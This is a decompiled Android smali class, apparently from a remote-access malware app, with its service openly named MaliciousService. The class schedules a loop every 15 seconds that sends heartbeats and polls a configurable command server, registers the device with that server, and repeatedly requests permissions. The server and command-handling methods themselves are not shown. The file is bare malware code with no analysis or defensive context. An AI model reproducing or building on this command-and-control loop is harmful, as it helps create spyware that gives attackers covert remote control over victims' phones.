.class Lcom/example/android/MaliciousService$1;
.super Ljava/lang/Object;
.source "MaliciousService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/android/MaliciousService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/android/MaliciousService;


# direct methods
.method public static synthetic $r8$lambda$AMGJuxW9jN94FJ1s9HAL0B0WlgI(Lcom/example/android/MaliciousService$1;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService$1;->lambda$run$1()V

    return-void
.end method

.method public static synthetic $r8$lambda$LJ7trz3MUn5O7flCRWfAu5VTpKg(Lcom/example/android/MaliciousService$1;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService$1;->lambda$run$0()V

    return-void
.end method

.method constructor <init>(Lcom/example/android/MaliciousService;)V
    .registers 2

    .line 86
    iput-object p1, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private synthetic lambda$run$0()V
    .registers 2

    .line 90
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$msendHeartbeat(Lcom/example/android/MaliciousService;)V

    return-void
.end method

.method private synthetic lambda$run$1()V
    .registers 2

    .line 92
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mcheckCommands(Lcom/example/android/MaliciousService;)V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 4

    .line 89
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MaliciousService"

    if-eqz v0, :cond_a8

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_a8

    .line 90
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v2, Lcom/example/android/MaliciousService$1$$ExternalSyntheticLambda0;

    invoke-direct {v2, p0}, Lcom/example/android/MaliciousService$1$$ExternalSyntheticLambda0;-><init>(Lcom/example/android/MaliciousService$1;)V

    invoke-interface {v0, v2}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    .line 91
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_63

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_63

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_63

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_63

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z

    move-result v0

    if-eqz v0, :cond_63

    .line 92
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lcom/example/android/MaliciousService$1$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0}, Lcom/example/android/MaliciousService$1$$ExternalSyntheticLambda1;-><init>(Lcom/example/android/MaliciousService$1;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    goto :goto_ad

    .line 94
    :cond_63
    const-string v0, "Server config or permissions not ready. Waiting."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 95
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mcheckAndRequestPermissions(Lcom/example/android/MaliciousService;)V

    .line 96
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mloadServerConfigFromPreferences(Lcom/example/android/MaliciousService;)V

    .line 97
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_ad

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_ad

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_ad

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgetSERVER_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_ad

    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z

    move-result v0

    if-eqz v0, :cond_ad

    .line 98
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$mregisterDeviceWithServer(Lcom/example/android/MaliciousService;)V

    goto :goto_ad

    .line 102
    :cond_a8
    const-string v0, "Device ID not available, skipping heartbeat and command check."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 104
    :cond_ad
    :goto_ad
    iget-object v0, p0, Lcom/example/android/MaliciousService$1;->this$0:Lcom/example/android/MaliciousService;

    invoke-static {v0}, Lcom/example/android/MaliciousService;->-$$Nest$fgethandler(Lcom/example/android/MaliciousService;)Landroid/os/Handler;

    move-result-object v0

    const-string v1, "15000"

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v1

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 105
    return-void
.end method
